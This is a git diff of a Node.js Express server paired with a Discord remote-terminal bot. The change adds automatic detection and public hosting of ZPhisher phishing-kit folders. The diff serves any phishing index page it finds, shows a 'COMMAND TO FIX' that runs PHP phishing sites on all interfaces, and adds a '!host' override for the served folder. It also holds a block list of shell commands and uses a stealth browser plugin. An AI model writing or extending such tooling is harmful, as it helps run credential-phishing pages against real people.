@@ -4,11 +4,50 @@ puppeteer.use(StealthPlugin());
 require('dotenv').config();
 
 const app = express();
+
+// --- STATE & PERSISTENCE ---
+const STATE_FILE = './state.json';
+let state = {
+    currentDir: process.cwd(),
+    activeId: 1,
+    manualWebDir: null, // User override (!host)
+    buffers: { 1: "", 2: "", 3: "" }
+};
+if (fs.existsSync(STATE_FILE)) {
+    try {
+        const saved = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
+        state = { ...state, ...saved };
+        if (fs.existsSync(state.currentDir)) process.chdir(state.currentDir);
+    } catch (e) { console.log("State Reset"); }
+}
+function saveState() {
+    state.currentDir = process.cwd();
+    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
+}
+
+// --- SMART DETECTION HELPERS ---
+const SMART_DIRS = ['zphisher/site', 'zphisher/sites', '.site', 'auth', 'site', 'website', 'zphisher'];
+function getSmartWebRoot() {
+    if (state.manualWebDir) {
+        const manualPath = path.resolve(process.cwd(), state.manualWebDir);
+        if (fs.existsSync(manualPath)) return manualPath;
+    }
+    for (const dir of SMART_DIRS) {
+        const fullPath = path.resolve(process.cwd(), dir);
+        if (fs.existsSync(fullPath)) {
+            if (fs.existsSync(path.join(fullPath, 'index.html')) || fs.existsSync(path.join(fullPath, 'index.php'))) {
+                return fullPath;
+            }
+        }
+    }
+    return null;
+}
+
 // --- DYNAMIC WEB HOSTING ---
 app.use((req, res, next) => {
-    const webPath = path.join(process.cwd(), state.currentWebDir);
-    if (fs.existsSync(webPath)) {
-        express.static(webPath)(req, res, next);
+    const webRoot = getSmartWebRoot();
+    if (webRoot) {
+        express.static(webRoot)(req, res, next);
     } else {
         next();
     }
@@ -23,13 +62,26 @@ app.get('/screen.png', (req, res) => {
 });
 
 app.get('/', (req, res) => {
-    const webPath = path.join(process.cwd(), state.currentWebDir);
-    const indexPath = path.join(webPath, 'index.html');
+    const webPath = getSmartWebRoot();
 
-    if (fs.existsSync(indexPath)) {
-        return res.sendFile(indexPath);
+    if (webPath) {
+        const indexPath = path.join(webPath, 'index.html');
+        if (fs.existsSync(indexPath)) return res.sendFile(indexPath);
+
+        const phpPath = path.join(webPath, 'index.php');
+        if (fs.existsSync(phpPath)) {
+            return res.send(`
+                <body style="background:#000;color:#f00;font-family:monospace;padding:50px;text-align:center;">
+                    <h1>⚠️ PHP Environment Detected</h1>
+                    <p>ZPhisher is running a PHP site, but this local server only hosts static HTML.</p>
+                    <hr style="border:1px solid #333;">
+                    <p style="color:#0f0;"><b>COMMAND TO FIX:</b><br>Type <code>! php -S 0.0.0.0:3000 -t ${webPath}</code> in Discord Terminal!</p>
+                </body>
+            `);
+        }
     }
 
+    // Fallback: Show OS Dashboard
     res.send(`
         <html>
             <head>
@@ -52,7 +104,7 @@ app.get('/', (req, res) => {
             <body>
                 <div class="container">
                     <h1><span class="pulse"></span> RENZU OS v1.0 - GOD MODE</h1>
-                    <div class="status">HOST: ${process.env.PORT || 3000} | ACTIVE_TERM: T${state.activeId} | WEB_ROOT: /${state.currentWebDir}</div>
+                    <div class="status">HOST: ${process.env.PORT || 3000} | ACTIVE_TERM: T${state.activeId} | WEB_ROOT: ${getSmartWebRoot() ? path.basename(getSmartWebRoot()) : 'AUTO'}</div>
                     
                     <div class="view-grid">
                         <div class="section">
@@ -86,27 +138,7 @@ const client = new Client({
 const OWNER_ID = '1104652354655113268'; // Hardcoded as requested
 const DANGEROUS_COMMANDS = ['rm', 'mv', 'chmod', 'sudo', 'touch', 'mkdir', 'rmdir', 'kill', 'shutdown', 'reboot', 'cat', 'vi', 'nano'];
 
-// --- ROBUST PERSISTENCE ---
-const STATE_FILE = './state.json';
-let state = {
-    currentDir: process.cwd(),
-    activeId: 1,
-    currentWebDir: 'auth', // Default folder to host
-    buffers: { 1: "", 2: "", 3: "", 4: "" }
-};
-
-if (fs.existsSync(STATE_FILE)) {
-    try {
-        const saved = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
-        state = { ...state, ...saved };
-        if (fs.existsSync(state.currentDir)) process.chdir(state.currentDir);
-    } catch (e) { console.log("State Reset"); }
-}
-
-function saveState() {
-    state.currentDir = process.cwd();
-    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
-}
+// State already initialized at top
 
 let terminals = {
     1: { process: null, message: null, lastSent: "" },
@@ -197,15 +229,15 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    if (msg.startsWith('!web ')) {
-        const folder = msg.slice(5).trim();
+    if (msg.startsWith('!host ')) {
+        const folder = msg.slice(6).trim();
         const fullPath = path.join(process.cwd(), folder);
         if (fs.existsSync(fullPath)) {
-            state.currentWebDir = folder;
+            state.manualWebDir = folder;
             saveState();
-            return message.reply(`✅ **Web Root Changed:** Website is now hosting files from \`/${folder}\``);
+            return message.reply(`✅ **Web Root Overridden:** Website is now hosting files from \`/${folder}\``);
         } else {
-            return message.reply(`❌ **Error:** Folder \`${folder}\` not found in project directory!`);
+            return message.reply(`❌ **Error:** Folder \`${folder}\` not found!`);
         }
     }
 
